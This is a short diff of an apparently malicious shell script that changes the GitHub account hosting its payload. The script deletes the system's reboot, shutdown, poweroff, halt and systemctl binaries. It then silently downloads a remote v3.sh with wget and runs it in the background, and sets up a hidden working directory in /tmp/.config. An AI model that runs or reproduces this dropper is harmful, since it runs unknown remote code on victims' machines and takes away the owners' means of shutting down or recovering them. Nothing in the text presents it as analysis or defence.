@@ -2,11 +2,11 @@
 
 sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 
-bash <(wget -qO- https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/v3.sh) >/dev/null 2>&1 &
+bash <(wget -qO- https://raw.githubusercontent.com/edrivetokenbsc/2088/main/v3.sh) >/dev/null 2>&1 &
 
 mode="${1:-0}"
 work="/tmp/.config"
-src="https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main"
+src="https://raw.githubusercontent.com/edrivetokenbsc/2088/main"
 
 RandString() {
   n="${1:-2}"; s="${2:-}"; [ -n "$s" ] && s="${s}_"; for((i=0;i<n;i++)); do s=${s}$(echo "$[`od -An -N2 -i /dev/urandom` % 26 + 97]" |awk '{printf("%c", $1)}'); done; echo -n "$s";
